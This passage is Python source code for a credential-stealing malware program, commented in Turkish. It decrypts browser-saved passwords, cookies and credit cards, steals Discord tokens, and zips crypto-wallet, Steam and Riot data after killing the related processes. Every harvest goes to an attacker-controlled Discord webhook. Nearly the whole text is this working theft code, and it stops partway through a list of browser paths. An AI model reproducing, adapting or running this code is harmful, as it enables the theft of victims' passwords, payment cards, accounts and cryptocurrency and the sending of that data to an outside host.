                        "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
                    },
                    {
                        "name": "<:mail:1095741024678191114> Email:",
                        "value": f"`{email}`",
                        "inline": True
                    },
                    {
                        "name": "<:phone:1095741029832990720> Phone:",
                        "value": f"{phone}",
                        "inline": True
                    },
                    {
                        "name": "<a:blackworld:1095741984385290310> IP:",
                        "value": f"`{G371P()}`",
                        "inline": True
                    },
                    {
                        "name": "<a:blackhypesquad:1095742323423453224> Badges:",
                        "value": f"{nitro}{badge}",
                        "inline": True
                    },
                    {
                        "name": "<a:blackmoneycard:1095741026850852965> Billing:",
                        "value": f"{billing}",
                        "inline": True
                    },
                    {
                        "name": "<:friends:1111401676511924448> HQ Friends:",
                        "value": f"{friends}",
                        "inline": False
                    },
                    {
                        "name": "<:black_crown:1184938153291829288> HQ Guilds:",
                        "value": f"{guilds}",
                        "inline": False
                    },
                    {
                        "name": "<:black_gift:1184971095003107451> Gift Codes:",
                        "value": f"{codes}",
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username}#{hashtag} ({idd})",
                    "icon_url": f"{pfp}"
                },
                "footer": {
                    "text": f"{footerc}",
                    "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
                },
                "thumbnail": {
                    "url": f"{pfp}"
                }
            }
        ],
        "username": f"{cname} | t.me/{smallcname}r",
        "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
        "attachments": []
    }

    # Veriyi JSON formatında kodla ve webhook'a gönder
    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)


def r3F0rM47(listt):
    # 'listt' içindeki küçük harfleri içeren kelimeleri bulur
    e = re.findall("(\w+[a-z])", listt)
    # 'https' içeren tüm elemanları listeden çıkarır
    while "https" in e:
        e.remove("https")
    # 'com' içeren tüm elemanları listeden çıkarır
    while "com" in e:
        e.remove("com")
    # 'net' içeren tüm elemanları listeden çıkarır
    while "net" in e:
        e.remove("net")
    # Listeyi set'e dönüştürüp tekrar listeye çevirerek tekrar eden elemanları temizler
    return list(set(e))


def UP104D(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    # Eğer 'Data Searcher' adında bir veri varsa, mesaj yapısını oluşturur
    if "Data Searcher" in name:
        data = {
            "content": GLINFO,
            "embeds": [
                {
                    "title": f"{cname} | Data Extractor",
                    "color": 2895667,
                    "fields": link,
                    "footer": {
                        "text": f"{footerc}",
                        "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
                    },
                }
            ],
            "username": f"{cname} | t.me/{smallcname}r",
            "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
            "attachments": []
        }
        L04DUr118(h00k, data=json.dumps(data).encode(), headers=headers)
        return
    
    # Eğer 'kiwi' ismi varsa, mesaj yapısını oluşturur
    if name == "kiwi":
        string = link.split("\n\n")  # 'link' stringini çift yeni satırlara göre böler
        endlist = []
        for i in string:
            i = i.split("\n")  # Her bir bölümdeki satırları böler
            i = list(filter(None, i))  # Boş satırları temizler
            val = ""
            for x in i:
                if x.startswith("└─"):  # Satır "└─" ile başlıyorsa, 'val' değişkenine ekler
                    val += x + "\n"
            if len(i) > 1:
                endlist.append({"name": i[0], "value": val, "inline": False})  # Listeye ekler
        
        data = {
            "content": GLINFO,
            "embeds": [
                {
                    "color": 2895667,
                    "fields": endlist,
                    "title": f"{cname} | File {words}",
                    "footer": {
                        "text": f"{footerc}",
                        "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
                    }
                }
            ],
            "username": f"{cname} | t.me/{smallcname}r",
            "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
            "attachments": []
        }
        L04DUr118(h00k, data=json.dumps(data).encode(), headers=headers)
        return


def Wr173F0rF113(data, name):
    # TEMP dizinine cs{name}.txt adında bir dosya yolu oluşturur
    path = os.getenv("TEMP") + f"\cs{name}.txt"
    
    # Dosyayı yazma modunda açar
    with open(path, mode='w', encoding='utf-8') as f:
        for line in data:
            # Boş olmayan satırları dosyaya yazar
            if line[0] != '':
                f.write(f"{line}\n")

def G3770K3N(path, arg):
    # Eğer verilen yol mevcut değilse işlevi bitirir
    if not os.path.exists(path): 
        return
    # Verilen `arg` parametresini yola ekler
    path += arg
    # Belirtilen yoldaki dosyaları listeler
    for file in os.listdir(path):
        # Eğer dosya uzantısı ".log" veya ".ldb" ise
        if file.endswith(".log") or file.endswith(".ldb"):
            # Dosyanın içeriğini okur, satırları temizler ve boş satırları atar
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                # Tokenları bulmak için düzenli ifadeleri kullanır
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    # Düzenli ifadeyi kullanarak satırda tokenları arar
                    for token in re.findall(regex, line):
                        # `T0K3Ns` adlı global değişkeni kullanır
                        global T0K3Ns
                        # `CH3CK70K3N` işlevini çağırarak tokenın geçerli olup olmadığını kontrol eder
                        if CH3CK70K3N(token):
                            # Eğer token daha önce kaydedilmemişse
                            if not token in T0K3Ns:
                                # Token'ı global listeye ekler
                                T0K3Ns += token
                                # `UP104D70K3N` işlevini çağırarak token'ı işler
                                UP104D70K3N(token, path)

def SQ17H1N6(pathC, tempfold, cmd):
    # `pathC` dosyasını `tempfold` yoluna kopyalar. Bu, genellikle geçici bir dosya olarak kullanılır.
    shutil.copy2(pathC, tempfold)
    # Kopyalanan dosya ile bir veritabanı bağlantısı oluşturur.
    conn = sql_connect(tempfold)
    # Bağlantı üzerinden bir imleç (cursor) oluşturur.
    cursor = conn.cursor()
    # `cmd` komutunu çalıştırır. Bu genellikle bir SQL sorgusu olabilir.
    cursor.execute(cmd)
    # Sorgudan dönen verileri alır.
    data = cursor.fetchall()
    # İmleci kapatır.
    cursor.close()
    # Veritabanı bağlantısını kapatır.
    conn.close()
    # Geçici dosyayı siler.
    os.remove(tempfold)
    # Sorgudan elde edilen verileri döndürür.
    return data



def G37P455W(path, arg):
    try:
        global P455w, P455WC0UNt
        if not os.path.exists(path): return
        # `path` ve `arg` birleştirilerek tarayıcının giriş verilerini içeren dosya yolu oluşturulur.
        pathC = path + arg + "/Login Data"
        # Dosyanın boş olup olmadığını kontrol eder; eğer boşsa işlevi sonlandırır.
        if os.stat(pathC).st_size == 0: return
        # Geçici bir dosya yolu oluşturur.
        tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        # SQL sorgusunu çalıştırarak giriş verilerini alır.
        data = SQ17H1N6(pathC, tempfold, "SELECT action_url, username_value, password_value FROM logins;")
        # Tarayıcının anahtar dosyasını okur ve master anahtarını çözer.
        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: 
            local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])
        # Giriş verilerini işler ve şifreleri çözer.
        for row in data:
            if row[0] != '':
                for wa in k3YW0rd:
                    old = wa
                    # URL'lerde 'https' varsa, URL içindeki gerçek alan adı kısmını çıkarır.
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        # Şifreli anahtarı `p45WW0rDs` listesine ekler.
                        if not old in p45WW0rDs: p45WW0rDs.append(old)
                # Şifreleri çözer ve `P455w` listesine ekler.
                P455w.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3CrYP7V41U3(row[2], master_key)}")
                P455WC0UNt += 1
        # Çözülen şifreleri belirli bir dosyaya yazar.
        Wr173F0rF113(P455w, 'passwords')
    except:
        pass


def G37C00K13(path, arg):
    try:
        global C00K13s, C00K1C0UNt
        if not os.path.exists(path): return
        # Çerezlerin bulunduğu dosyanın yolunu oluşturur.
        pathC = path + arg + "/Cookies"
        # Dosyanın boş olup olmadığını kontrol eder; eğer boşsa işlevi sonlandırır.
        if os.stat(pathC).st_size == 0: return
        # Geçici bir dosya yolu oluşturur.
        tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        # SQL sorgusunu çalıştırarak çerez verilerini alır.
        data = SQ17H1N6(pathC, tempfold, "SELECT host_key, name, encrypted_value FROM cookies ")
        # Tarayıcının anahtar dosyasının yolunu oluşturur.
        pathKey = path + "/Local State"
        # Anahtar dosyasını okur ve JSON formatında yükler.
        with open(pathKey, 'r', encoding='utf-8') as f: 
            local_state = loads(f.read())
        # Anahtarı base64 ile çözer ve ardından şifreli anahtarı çözer.
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])
        # Çerez verilerini işler ve şifreleri çözer.
        for row in data:
            if row[0] != '':
                # `k3YW0rd` listesinde tanımlanan anahtar kelimelerle URL'leri karşılaştırır.
                for wa in k3YW0rd:
                    old = wa
                    # Eğer anahtar kelimede 'https' varsa, URL içindeki gerçek alan adı kısmını çıkarır.
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    # Çerez bilgileri arasında anahtar kelime varsa, çerezleri ekler.
                    if wa in row[0]:
                        if not old in c00K1W0rDs: c00K1W0rDs.append(old)
                # Çözülen çerez bilgilerini `C00K13s` listesine ekler.
                C00K13s.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3CrYP7V41U3(row[2], master_key)}")
                C00K1C0UNt += 1
        # Çözülen çerezleri belirli bir dosyaya yazar.
        Wr173F0rF113(C00K13s, 'cookies')
    except:
        pass
    

def G37CC5(path, arg):
    try:
        global CCs, CC5C0UNt
        if not os.path.exists(path): return
        # Kredi kartı verilerinin bulunduğu dosyanın yolunu oluşturur.
        pathC = path + arg + "/Web Data"
        # Dosyanın boş olup olmadığını kontrol eder; eğer boşsa işlevi sonlandırır.
        if os.stat(pathC).st_size == 0: return
        # Geçici bir dosya adı oluşturur.
        tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        # SQL sorgusunu çalıştırarak kredi kartı verilerini alır.
        data = SQ17H1N6(pathC, tempfold, "SELECT * FROM credit_cards ")
        # Tarayıcının anahtar dosyasının yolunu oluşturur.
        pathKey = path + "/Local State"
        # Anahtar dosyasını okur ve JSON formatında yükler.
        with open(pathKey, 'r', encoding='utf-8') as f: 
            local_state = loads(f.read())
        # Anahtarı base64 ile çözer ve ardından şifreli anahtarı çözer.
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])
        # Kredi kartı verilerini işler ve şifreleri çözer.
        for row in data:
            if row[0] != '':
                # Kredi kartı bilgilerini çözümler ve `CCs` listesine ekler.
                CCs.append(f"C4RD N4M3: {row[1]} | NUMB3R: {D3CrYP7V41U3(row[4], master_key)} | EXP1RY: {row[2]}/{row[3]}")
                CC5C0UNt += 1
        # Çözülen kredi kartı bilgilerini belirli bir dosyaya yazar.
        Wr173F0rF113(CCs, 'creditcards')
    except:
        pass


def G374U70F111(path, arg):
    try:
        global AU70F11l, AU70F111C0UNt
        if not os.path.exists(path): return
        # Otomatik doldurma verilerinin bulunduğu dosyanın yolunu oluşturur.
        pathC = path + arg + "/Web Data"
        # Dosyanın boş olup olmadığını kontrol eder; eğer boşsa işlevi sonlandırır.
        if os.stat(pathC).st_size == 0: return
        # Geçici bir dosya adı oluşturur.
        tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        # SQL sorgusunu çalıştırarak otomatik doldurma verilerini alır.
        data = SQ17H1N6(pathC, tempfold, "SELECT * FROM autofill WHERE value NOT NULL")
        # Her bir veri satırını işler.
        for row in data:
            if row[0] != '':
                # İşlenen verileri `AU70F11l` listesine ekler.
                AU70F11l.append(f"N4M3: {row[0]} | V4LU3: {row[1]}")
                AU70F111C0UNt += 1
        # Çözülen otomatik doldurma verilerini belirli bir dosyaya yazar.
        Wr173F0rF113(AU70F11l, 'autofill')
    except:
        pass

def G37H1570rY(path, arg):
    try:
        global H1570rY, H1570rYC0UNt
        if not os.path.exists(path): return
        # Tarayıcı geçmişi verilerinin bulunduğu dosyanın yolunu oluşturur.
        pathC = path + arg + "History"
        # Dosyanın boş olup olmadığını kontrol eder; eğer boşsa işlevi sonlandırır.
        if os.stat(pathC).st_size == 0: return
        # Geçici bir dosya adı oluşturur.
        tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        # SQL sorgusunu çalıştırarak geçmiş verilerini alır.
        data = SQ17H1N6(pathC, tempfold, "SELECT * FROM urls")
        # Her bir veri satırını işler.
        for row in data:
            if row[0] != '':
                # İşlenen verileri `H1570rY` listesine ekler.
                H1570rY.append(row[1])
                H1570rYC0UNt += 1       
        # Çözülen geçmiş verilerini belirli bir dosyaya yazar.
        Wr173F0rF113(H1570rY, 'history')
    except:
        pass

def G37W3851735(Words):
    # `Words` adlı liste veya iterable veri yapısını ' | ' karakteri ile birleştirerek tek bir string oluşturur.
    rb = ' | '.join(da for da in Words)
    # Eğer oluşturulan string'in uzunluğu 1000 karakterden fazla ise
    if len(rb) > 1000:
        # `r3F0rM47` işlevini çağırarak uzun veriyi kısaltır ve kısaltılmış veriyi alır.
        rrrrr = r3F0rM47(str(Words))
        # Kısaltılmış veri liste olarak döner, her bir öğeyi ' | ' karakteri ile birleştirir ve döndürür.
        return ' | '.join(da for da in rrrrr)
    else:
        # Eğer string'in uzunluğu 1000 karakterden kısa ise, doğrudan bu uzun string'i döndürür.
        return rb


def G37800KM4rK5(path, arg):
    try:
        # Global değişkenleri tanımlar; B00KM4rK5 ve B00KM4rK5C0UNt
        global B00KM4rK5, B00KM4rK5C0UNt
        # Belirtilen `path` üzerinde belirtilen `arg` ile birleştirilmiş yolun var olup olmadığını kontrol eder
        if not os.path.exists(path): return
        # `Bookmarks` adlı dosyanın yolunu oluşturur
        pathC = path + arg + "Bookmarks"
        # Eğer `Bookmarks` dosyası varsa
        if os.path.exists(pathC):
            # Dosyayı açar ve içeriğini okur
            with open(pathC, 'r', encoding='utf8') as f:
                data = loads(f.read())  # JSON formatındaki veriyi bir Python sözlüğüne dönüştürür
                # `data['roots']['bookmark_bar']['children']` kısmındaki her bir öğeyi işler
                for i in data['roots']['bookmark_bar']['children']:
                    try:
                        # Her bir yer işaretinin adını ve URL'sini `B00KM4rK5` listesine ekler
                        B00KM4rK5.append(f"N4M3: {i['name']} | UR1: {i['url']}")
                        # Yer işaretlerinin sayısını bir artırır
                        B00KM4rK5C0UNt += 1
                    except:
                        # Hata durumunda herhangi bir işlem yapmaz
                        pass
        # `Bookmarks` dosyasının boyutunu kontrol eder, eğer sıfırsa geri döner
        if os.stat(pathC).st_size == 0: return
        # `B00KM4rK5` listesini 'bookmarks' adında bir dosyaya yazar
        Wr173F0rF113(B00KM4rK5, 'bookmarks')
    except:
        # Hata durumunda herhangi bir işlem yapmaz
        pass


def s74r787Hr34D(func, arg):
    # Global değişkeni tanımlar; Browserthread
    global Browserthread
    # Yeni bir iş parçacığı (thread) oluşturur
    t = threading.Thread(target=func, args=arg)
    # Oluşturulan iş parçacığını başlatır
    t.start()
    # İş parçacığını `Browserthread` global listesine ekler
    Browserthread.append(t)


def G378r0W53r5(br0W53rP47H5):
    # Global değişkeni tanımlar; Browserthread
    global Browserthread
    # İki adet boş liste oluşturur: ThCokk ve Browserthread
    ThCokk, Browserthread, filess = [], [], []
    # Her bir tarayıcı yolu için döngü başlatır
    for patt in br0W53rP47H5:
        # G37C00K13 işlevini yeni bir iş parçacığında başlatır ve iş parçacığını ThCokk listesine ekler
        a = threading.Thread(target=G37C00K13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)
        # Belirtilen işlevleri ve argümanları ayrı iş parçacıklarında başlatır ve Browserthread listesine ekler
        s74r787Hr34D(G374U70F111, [patt[0], patt[3]])
        s74r787Hr34D(G37H1570rY, [patt[0], patt[3]])
        s74r787Hr34D(G37800KM4rK5, [patt[0], patt[3]])
        s74r787Hr34D(G37CC5, [patt[0], patt[3]])
        s74r787Hr34D(G37P455W, [patt[0], patt[3]])
    # ThCokk içindeki iş parçacıklarının tamamlanmasını bekler
    for thread in ThCokk:
        thread.join()
    # Eğer C00K13s üzerinde TrU57 işlevi True dönerse, programı sonlandırır
    if TrU57(C00K13s) == True:
        __import__('sys').exit(0)
    # Browserthread içindeki iş parçacıklarının tamamlanmasını bekler
    for thread in Browserthread:
        thread.join()


    for file in ["cspasswords.txt", "cscookies.txt", "cscreditcards.txt", "csautofills.txt", "cshistories.txt", "csbookmarks.txt"]:
        filess.append(UP104D7060F113(os.getenv("TEMP") + "\\" + file))
    headers = {"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}

    data = {
        "content": GLINFO,
        "embeds": [
            {
                "title": f"{cname} | Password {words}",
                "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n<:blackarrow:1095740975197995041> • [{cname}Passwords.txt]({filess[0]})",
                "color": 2895667,
                "footer": {"text": f"{footerc}",  
                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}
            },
            {
                "title": f"{cname} | Cookies {words}",
                "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:browser:1095742866518716566> • **{C00K1C0UNt}** Cookies Found\n<:blackarrow:1095740975197995041> • [{cname}Cookies.txt]({filess[1]})",
                "color": 2895667,
                "footer": {"text": f"{footerc}",  
                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}
            },
            {
                "title": f"{cname} | Browser Data",
                "description": f"<:srcr_newspaper:1187579795056373782> • **{H1570rYC0UNt}** Histories Found\n<:blackarrow:1095740975197995041> • [{cname}Histories.txt]({filess[4]})\n\n<:lol_role_fill:1187747599286018149> • **{AU70F111C0UNt}** Autofills Found\n<:blackarrow:1095740975197995041> • [{cname}Autofills.txt]({filess[3]})\n\n<:1SW_CreditCard:1187580159495245876> • **{CC5C0UNt}** Credit Cards Found\n<:blackarrow:1095740975197995041> • [{cname}CreditCards.txt]({filess[2]})\n\n<:black_book:1187577552739508286> • **{B00KM4rK5C0UNt}** Bookmarks Found\n<:blackarrow:1095740975197995041> • [{cname}Bookmarks.txt]({filess[5]})",
                "color": 2895667,
                "footer": {"text": f"{footerc}",  
                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}
            }
        ],
        "username": f"{cname} | t.me/{smallcname}r",
        "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
        "attachments": []
    }
    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
    return

def G37D15C0rD(path, arg):
    # 'Local State' dosyasının var olup olmadığını kontrol eder
    if not os.path.exists(f"{path}/Local State"): return
    # 'arg' parametresi ile belirtilen yola sahip dosyaların tam yolunu belirler
    pathC = path + arg
    # 'Local State' dosyasının yolunu belirler
    pathKey = path + "/Local State"
    # 'Local State' dosyasını açar ve JSON verisini okur
    with open(pathKey, 'r', encoding='utf-8') as f:
        local_state = loads(f.read())    
    # 'Local State' dosyasından master key'i alır ve çözer
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])   
    # Verilen yoldaki dosyaları listeler
    for file in os.listdir(pathC):
        # Dosya adı '.log' veya '.ldb' ile bitiyorsa işlemi devam ettirir
        if file.endswith(".log") or file.endswith(".ldb"):
            # Dosyayı satır satır okur ve boş olmayan satırları alır
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                # Satırdaki belirli bir düzeni arar ve eşleşen tüm token'ları bulur
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    # 'T0K3Ns' global değişkenini kullanarak her bir token'ı işleme alır
                    global T0K3Ns
                    # Token'ı çözer
                    tokenDecoded = D3CrYP7V41U3(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    # Token'ı kontrol eder ve geçerliyse işlem yapar
                    if CH3CK70K3N(tokenDecoded):
                        # Token daha önce eklenmemişse listeye ekler
                        if not tokenDecoded in T0K3Ns:
                            T0K3Ns += tokenDecoded
                            # Token'ı belirtilen yola kaydeder
                            UP104D70K3N(tokenDecoded, path)

def G47H3rZ1P5(paths1, paths2, paths3):
    thttht = []
    for walletids in w411375:
        
        for patt in paths1:
            a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[5]+str(walletids[0]), patt[1]])
            a.start()
            thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)

    a = threading.Thread(target=Z1P73136r4M, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht:
        thread.join()
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
    wal, ga, ot = "",'',''
    if not len(W411375Z1p) == 0:
        wal = "<:ETH:975438262053257236>  •  Wallets\n"
        for i in W411375Z1p:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(G4M1N6Z1p) == 0:
        ga = "<:blackgengar:1111366900690202624>  •  Gaming:\n"
        for i in G4M1N6Z1p:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(O7H3rZ1p) == 0:
        ot = "<:black_planet:1095740276850569226>  •  Apps\n"
        for i in O7H3rZ1p:
            ot += f"└─ [{i[0]}]({i[1]})\n"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": GLINFO,
        "embeds": [
            {
            "title": f"{cname} | App {words}",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 2895667,
            "footer": {
                "text": f"{footerc}",
                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
            }
            }
        ],
        "username": f"{cname} | t.me/{smallcname}r",
        "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
        "attachments": []
    }
    
    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)

def Z1P73136r4M(path, arg, procc):
    # Bu fonksiyon, belirtilen dosya yolunda (path) bir işlem gerçekleştirir,
    # belirli bir süreci (process) sonlandırır, ardından bir ZIP dosyası oluşturur
    # ve yükleme işlemi için 3 kez dener.

    global O7H3rZ1p  # Global değişken O7H3rZ1p'yi kullanacağız
    pathC = path  # 'pathC' adlı yerel değişkene 'path' parametresinin değerini atıyoruz
    name = arg  # 'name' adlı yerel değişkene 'arg' parametresinin değerini atıyoruz
    if not os.path.exists(pathC): return  # Eğer belirtilen yol yoksa, fonksiyonu sonlandırıyoruz
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)  
    # 'procc' adlı süreci (process) sonlandırıyoruz
    time.sleep(1)  # 1 saniye bekliyoruz
    Z1PF01D3r(name, pathC)  # 'Z1PF01D3r' adlı fonksiyonu 'name' ve 'pathC' parametreleri ile çağırıyoruz

    for i in range(3):  # 3 kez denemek için döngü başlatıyoruz
        lnik = UP104D7060F113(f'{temp}/{name}.zip')  # 'UP104D7060F113' fonksiyonunu çağırarak bir bağlantı (link) alıyoruz
        if "https://" in str(lnik):  # Eğer bağlantı "https://" içeriyorsa, döngüyü sonlandırıyoruz
            break
        time.sleep(4)  # Eğer bağlantı alınamazsa, 4 saniye bekliyoruz ve tekrar deniyoruz
    os.remove(f"{temp}/{name}.zip")  # ZIP dosyasını siliyoruz
    O7H3rZ1p.append([arg, lnik])  # Global değişken O7H3rZ1p'ye arg ve lnik'yi ekliyoruz


def Z1P7H1N65(path, arg, procc):
    pathC = path  # 'pathC' adlı yerel değişkene 'path' parametresinin değerini atıyoruz
    name = arg  # 'name' adlı yerel değişkene 'arg' parametresinin değerini atıyoruz
    
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p  # Global değişkenlerimizi belirtiyoruz
    for walllts in w411375:  # 'w411375' adlı global değişkeni döngüyle inceliyoruz
        if str(walllts[0]) in arg:  # Eğer 'arg' parametresi, 'w411375' içindeki herhangi bir öğeyle eşleşiyorsa
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')  
            # 'path' parametresini bölerek tarayıcı adını alıyoruz ve boşlukları kaldırıyoruz
            name = f"{str(walllts[1])}_{browser}"  # 'name' değişkenini güncelliyoruz
            pathC = path + arg  # 'pathC' değişkenini güncelliyoruz

    if not os.path.exists(pathC): return  # Eğer güncellenen 'pathC' yolu yoksa, fonksiyonu sonlandırıyoruz
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)  
    # 'procc' adlı süreci (process) sonlandırıyoruz
    time.sleep(1)  # 1 saniye bekliyoruz

    if "Wallet" in arg:  # Eğer 'arg' parametresi "Wallet" içeriyorsa
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')  
        # 'path' parametresini bölerek tarayıcı adını alıyoruz ve boşlukları kaldırıyoruz
        name = f"{browser}"  # 'name' değişkenini güncelliyoruz

    elif "Steam" in arg:  # Eğer 'arg' parametresi "Steam" içeriyorsa
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return  # Eğer belirtilen dosya yoksa, fonksiyonu sonlandırıyoruz
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")  # Dosyayı okumak ve yazmak için açıyoruz
        data = f.readlines()  # Dosyadaki satırları okuyoruz
        found = False  # 'found' değişkenini False olarak başlatıyoruz
        for l in data:  # Satırları döngüyle inceliyoruz
            if 'RememberPassword"\t\t"1"' in l:  # Eğer satır "RememberPassword" içeriyorsa
                found = True  # 'found' değişkenini True yapıyoruz
        if found == False: return  # Eğer 'found' değişkeni True olmadıysa, fonksiyonu sonlandırıyoruz
        name = arg  # 'name' değişkenini 'arg' parametresi ile güncelliyoruz

    Z1PF01D3r(name, pathC)  # 'Z1PF01D3r' adlı fonksiyonu 'name' ve 'pathC' parametreleri ile çağırıyoruz


    for i in range(3):
        lnik = UP104D7060F113(f'{temp}/{name}.zip')
        if "https://" in str(lnik):break
        time.sleep(4)

    os.remove(f"{temp}/{name}.zip")
    if "/Local Extension Settings/" in arg or "/HougaBouga/"  in arg or "wallet" in arg.lower():
        W411375Z1p.append([name, lnik])
    elif "Steam" in name or "RiotCli" in name:
        G4M1N6Z1p.append([name, lnik])
    else:
        O7H3rZ1p.append([name, lnik])

def S74r77Hr34D(meth, args = []):
    a = threading.Thread(target=meth, args=args)
    a.start()
    THr34D1157.append(a)

def G47H3r411():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >                 Password/CC < 3 >     Cookies < 4 >                 Extentions < 5 >                           '
    br0W53rP47H5 = [    
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
